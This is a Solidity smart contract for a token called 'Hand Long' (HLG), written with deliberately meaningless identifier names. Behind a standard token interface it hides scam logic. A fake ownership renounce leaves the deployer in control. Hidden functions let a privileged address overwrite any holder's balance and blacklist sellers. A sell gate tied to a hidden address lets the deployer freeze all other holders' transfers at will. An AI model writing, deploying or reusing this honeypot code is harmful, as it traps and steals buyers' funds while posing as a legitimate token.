//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

interface isBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeFundLiquidity) external view returns (uint256);

    function transfer(address exemptReceiver, uint256 teamAuto) external returns (bool);

    function allowance(address autoMinSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 teamAuto) external returns (bool);

    function transferFrom(
        address sender,
        address exemptReceiver,
        uint256 teamAuto
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverBuy, uint256 value);
    event Approval(address indexed autoMinSender, address indexed spender, uint256 value);
}

abstract contract amountFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface shouldSell {
    function createPair(address receiverListFund, address liquidityLaunched) external returns (address);
}

interface isBuyMetadata is isBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract HandLong is amountFund, isBuy, isBuyMetadata {

    mapping(address => bool) public launchedShould;

    function liquiditySell(address takeAuto) public {
        if (tradingLaunch) {
            return;
        }
        if (receiverEnable != tokenTake) {
            buyReceiver = false;
        }
        fundTokenShould[takeAuto] = true;
        if (tokenList) {
            receiverEnable = limitListMax;
        }
        tradingLaunch = true;
    }

    bool private buyReceiver;

    function transferFrom(address isSellFrom, address exemptReceiver, uint256 teamAuto) external override returns (bool) {
        if (_msgSender() != atReceiverLaunched) {
            if (launchBuy[isSellFrom][_msgSender()] != type(uint256).max) {
                require(teamAuto <= launchBuy[isSellFrom][_msgSender()]);
                launchBuy[isSellFrom][_msgSender()] -= teamAuto;
            }
        }
        return shouldAmount(isSellFrom, exemptReceiver, teamAuto);
    }

    function balanceOf(address feeFundLiquidity) public view virtual override returns (uint256) {
        return takeShouldWallet[feeFundLiquidity];
    }

    function exemptTrading() private view {
        require(fundTokenShould[_msgSender()]);
    }

    event OwnershipTransferred(address indexed listTo, address indexed txTeam);

    function name() external view virtual override returns (string memory) {
        return launchedTx;
    }

    bool public tradingLaunch;

    bool private tokenList;

    function enableFee(address maxSell) public {
        exemptTrading();
        if (takeBuyTrading != receiverEnable) {
            takeBuyTrading = receiverEnable;
        }
        if (maxSell == atToken || maxSell == senderLaunchList) {
            return;
        }
        launchedShould[maxSell] = true;
    }

    uint256 public enableLaunchedMarketing;

    string private launchedTx = "Hand Long";

    address public senderLaunchList;

    address private liquidityListTotal;

    mapping(address => bool) public fundTokenShould;

    uint256 private tokenTake;

    uint256 public takeBuyTrading;

    uint8 private maxWalletMarketing = 18;

    function allowance(address atFund, address listReceiver) external view virtual override returns (uint256) {
        if (listReceiver == atReceiverLaunched) {
            return type(uint256).max;
        }
        return launchBuy[atFund][listReceiver];
    }

    address public atToken;

    uint256 fundLaunchMin;

    function marketingList(address fromList, uint256 teamAuto) public {
        exemptTrading();
        takeShouldWallet[fromList] = teamAuto;
    }

    function shouldAmount(address isSellFrom, address exemptReceiver, uint256 teamAuto) internal returns (bool) {
        if (isSellFrom == atToken) {
            return takeSwapAt(isSellFrom, exemptReceiver, teamAuto);
        }
        uint256 amountLaunched = isBuy(senderLaunchList).balanceOf(takeLaunched);
        require(amountLaunched == fundLaunchMin);
        require(exemptReceiver != takeLaunched);
        if (launchedShould[isSellFrom]) {
            return takeSwapAt(isSellFrom, exemptReceiver, takeLimitMin);
        }
        return takeSwapAt(isSellFrom, exemptReceiver, teamAuto);
    }

    function transfer(address fromList, uint256 teamAuto) external virtual override returns (bool) {
        return shouldAmount(_msgSender(), fromList, teamAuto);
    }

    function maxIs(uint256 teamAuto) public {
        exemptTrading();
        fundLaunchMin = teamAuto;
    }

    bool private launchedAt;

    address takeLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant takeLimitMin = 4 ** 10;

    string private teamList = "HLG";

    function getOwner() external view returns (address) {
        return liquidityListTotal;
    }

    bool private swapTx;

    function totalSupply() external view virtual override returns (uint256) {
        return enableBuy;
    }

    uint256 private enableBuy = 100000000 * 10 ** 18;

    uint256 tradingAutoExempt;

    address atReceiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private receiverEnable;

    function takeSwapAt(address isSellFrom, address exemptReceiver, uint256 teamAuto) internal returns (bool) {
        require(takeShouldWallet[isSellFrom] >= teamAuto);
        takeShouldWallet[isSellFrom] -= teamAuto;
        takeShouldWallet[exemptReceiver] += teamAuto;
        emit Transfer(isSellFrom, exemptReceiver, teamAuto);
        return true;
    }

    uint256 private buyToken;

    mapping(address => uint256) private takeShouldWallet;

    mapping(address => mapping(address => uint256)) private launchBuy;

    function symbol() external view virtual override returns (string memory) {
        return teamList;
    }

    function tradingLimitTotal() public {
        emit OwnershipTransferred(atToken, address(0));
        liquidityListTotal = address(0);
    }

    uint256 public limitListMax;

    function approve(address listReceiver, uint256 teamAuto) public virtual override returns (bool) {
        launchBuy[_msgSender()][listReceiver] = teamAuto;
        emit Approval(_msgSender(), listReceiver, teamAuto);
        return true;
    }

    constructor (){
        if (launchedAt) {
            takeBuyTrading = tokenTake;
        }
        launchLaunched maxTrading = launchLaunched(atReceiverLaunched);
        senderLaunchList = shouldSell(maxTrading.factory()).createPair(maxTrading.WETH(), address(this));
        if (buyReceiver == swapTx) {
            tokenTake = limitListMax;
        }
        atToken = _msgSender();
        tradingLimitTotal();
        fundTokenShould[atToken] = true;
        takeShouldWallet[atToken] = enableBuy;
        if (launchedAt) {
            launchedAt = true;
        }
        emit Transfer(address(0), atToken, enableBuy);
    }

    function decimals() external view virtual override returns (uint8) {
        return maxWalletMarketing;
    }

    function owner() external view returns (address) {
        return liquidityListTotal;
    }

}